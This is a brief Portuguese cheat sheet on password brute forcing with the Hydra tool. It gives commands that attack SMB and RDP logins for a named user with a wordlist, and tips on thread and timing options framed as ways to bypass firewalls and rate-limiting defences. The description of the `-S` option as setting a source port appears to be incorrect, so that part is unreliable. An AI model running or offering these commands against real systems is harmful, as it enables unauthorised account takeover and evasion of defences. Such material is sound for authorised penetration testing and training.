<h1 align="center"> Brute force com Hydra</h1>
<hr>

```sh
hydra -v -l rogerio -P senhas.txt <IP> smb
hydra -v -l rogerio -P senhas.txt <IP> rdp
```

## Dicas

Uma opcao que a gente usa bastante seria a opcao `-S` para voce colocar uma porta de origem
a opcao `-T` para tasks ou quantidade de threads paralelas. A opcao `-W` para definir o tempo esse seria um bom caso para bypassar um controle de firewall ou qualquer mecanismo de defesa que bloqueia uma grande quantidade de requisicao em pouco tempo.